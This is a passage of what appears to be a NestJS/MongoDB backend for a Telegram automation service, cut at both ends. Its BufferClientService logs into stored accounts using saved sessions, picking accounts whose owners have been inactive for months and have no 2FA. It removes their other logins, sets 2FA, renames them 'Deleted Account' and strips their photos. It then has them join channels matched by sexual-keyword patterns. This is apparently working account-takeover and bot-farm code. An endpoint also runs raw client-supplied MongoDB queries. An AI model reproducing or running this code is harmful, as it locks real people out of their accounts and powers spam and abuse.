})\r\n  async setAsBufferClient(\r\n    @Param('mobile') mobile: string,\r\n  ) {\r\n    return await this.clientService.setAsBufferClient(mobile);\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\r\n    return this.clientService.findOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Put(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('mobile') mobile: string): Promise<void> {\r\n    return this.clientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({ type: Object })\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.clientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { BufferClientService } from './buffer-client.service';\r\nimport { BufferClientController } from './buffer-client.controller';\r\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => UsersModule),\r\n    forwardRef(() => ActiveChannelsModule),\r\n    forwardRef(() => ClientModule),\r\n    forwardRef(() => ChannelsModule),\r\n    forwardRef(() => PromoteClientModule)\r\n ],\r\n  controllers: [BufferClientController],\r\n  providers: [BufferClientService],\r\n  exports: [BufferClientService]\r\n})\r\nexport class BufferClientModule { }\r\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\n\n@Injectable()\nexport class BufferClientService {\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n    ) {}\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        const newUser = new this.bufferClientModel(bufferClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<BufferClient[]> {\n        return this.bufferClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            console.log(\"Joining Channel Started\")\n            await this.telegramService.disconnectAll();\n            this.clearJoinChannelInterval();\n            await sleep(2000);\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n            // const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n            if (clients.length > 0) {\n                for (const document of clients) {\n                    try {\n                        const client = await this.telegramService.createClient(document.mobile, false, false);\n                        console.log(\"Started Joining for : \", document.mobile)\n                        const channels = await client.channelInfo(true);\n                        console.log(\"Existing Channels Length : \", channels.ids.length);\n                        await this.update(document.mobile, { channels: channels.ids.length });\n                        let result = [];\n                        if (channels.canSendFalseCount < 50) {\n                            if (channels.ids.length < 220) {\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                            } else {\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                            }\n                            this.joinChannelMap.set(document.mobile, result);\n                            await this.telegramService.deleteClient(document.mobile);\n                        } else {\n                            client.leaveChannels(channels.canSendFalseChats)\n                        }\n                        // console.log(\"DbChannelsLen: \", result.length);\n                        // let resp = '';\n                        // this.telegramService.joinChannels(document.mobile, result);\n                    } catch (error) {\n                        await this.telegramService.deleteClient(document.mobile);\n                        parseError(error)\n                    }\n                }\n                this.joinChannelQueue();\n            }\n            console.log(\"Joining Channel Triggered Succesfully for \", clients.length);\n            return `Initiated Joining channels ${clients.length}`\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async joinChannelQueue() {\n        const existingkeys = Array.from(this.joinChannelMap.keys())\n        if (existingkeys.length > 0) {\n            this.joinChannelIntervalId = setInterval(async () => {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length > 0) {\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\n                    for (const mobile of keys) {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (channels && channels.length > 0) {\n                            const channel = channels.shift();\n                            console.log(mobile, \" Pending Channels :\", channels.length)\n                            this.joinChannelMap.set(mobile, channels);\n                            try {\n                                await this.telegramService.createClient(mobile, false, false);\n                                console.log(mobile, \" Trying to join :\", channel.username);\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\n                            } catch (error) {\n                                await this.telegramService.deleteClient(mobile);\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\n                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {\n                                    this.removeFromBufferMap(mobile)\n                                    const channels = await this.telegramService.getChannelInfo(mobile, true);\n                                    // await this.update(mobile, { channels: channels.ids.length });\n                                }\n                            }\n                            await this.telegramService.deleteClient(mobile);\n                        } else {\n                            this.joinChannelMap.delete(mobile);\n                        }\n                    }\n                } else {\n                    this.clearJoinChannelInterval()\n                }\n            }, 4 * 60 * 1000);\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            setTimeout(() => {\n                this.joinchannelForBufferClients(false)\n            }, 30000);\n        }\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await this.telegramService.createClient(mobile, false)\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                // await sleep(3000)\n                // await telegramClient.deleteProfilePhotos();\n                // const channels = await this.telegramService.getChannelInfo(mobile, true)\n                // const bufferClient = {\n                //     tgId: user.tgId,\n                //     session: user.session,\n                //     mobile: user.mobile,\n                //     availableDate,\n                //     channels: channels.ids.length,\n                // }\n                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const bufferclients = await this.findAll();\n            let goodIds: string[] = [];\n            let badIds: string[] = [];\n            if (bufferclients.length < 70) {\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const promoteclients = await this.promoteClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const promoteclientIds = promoteclients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of bufferclients) {\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000)\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                            await sleep(2000)\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.deleteClient(document.mobile)\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile)\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoBufferClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New buffer documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const bufferClient = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created BufferClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as BufferClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForBufferClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\r\n\r\nexport class SearchBufferClientDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly tgId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly mobile?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'availableDate of the bufferClient',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly availableDate?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Session identifier',\r\n    example: 'session123',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly session?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels?: number;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\r\n\r\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { BuildService } from './build.service';\r\n\r\n@ApiTags('Build')\r\n@Controller('builds')\r\nexport class BuildController {\r\n  constructor(private readonly buildService: BuildService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get build data' })\r\n  async findOne(): Promise<any>{\r\n    return this.buildService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update build' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.buildService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { BuildService } from './build.service';\r\nimport { BuildController } from './build.controller';\r\nimport { BuildSchema } from './builds.schema';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    BuildModule,\r\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\r\n    NpointModule,\r\n  ],\r\n  providers: [BuildService],\r\n  controllers: [BuildController],\r\n  exports: [BuildModule],\r\n})\r\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\r\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\r\nimport { ChannelsService } from './channels.service';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\r\nimport { SearchChannelDto } from './dto/search-channel.dto';\r\nimport { CreateChannelDto } from './dto/create-channel.dto';\r\nimport { UpdateChannelDto } from './dto/update-channel.dto';\r\nimport { Channel } from './schemas/channel.schema';\r\n\r\n@ApiTags('Channels')\r\n@Controller('channels')\r\nexport class ChannelsController {\r\n  constructor(private readonly channelsService: ChannelsService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new  channel' })\r\n  async create(@Body() createChannelDto: CreateChannelDto) {\r\n    return this.channelsService.create(createChannelDto);\r\n  }\r\n  @Post('createMultiple')\r\n  @ApiOperation({ summary: 'Create multiple channels' })\r\n  @ApiBody({ type: [CreateChannelDto] })\r\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\r\n    return this.channelsService.createMultiple(createChannelDtos);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search channels by filters' })\r\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\r\n    console.log(query);\r\n    return this.channelsService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all  channels' })\r\n  async findAll() {\r\n    return this.channelsService.findAll();\r\n  }\r\n\r\n  @Get(':channelId')\r\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async findOne(@Param('channelId') channelId: string) {\r\n    return this.channelsService.findOne(channelId);\r\n  }\r\n\r\n  @Patch(':channelId')\r\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\r\n    return this.channelsService.update(channelId, updateChannelDto);\r\n  }\r\n\r\n  @Delete(':channelId')\r\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async remove(@Param('channelId') channelId: string) {\r\n    return this.channelsService.remove(channelId);\r\n  }\r\n}\r\n","// src/channels/channels.module.ts\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ChannelsService } from './channels.service';\r\nimport { ChannelsController } from './channels.controller';\r\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\r\n  ],\r\n  controllers: [ChannelsController],\r\n  providers: [ChannelsService],\r\n  exports: [ChannelsService]\r\n})\r\nexport class ChannelsModule { }\r\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    let query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': 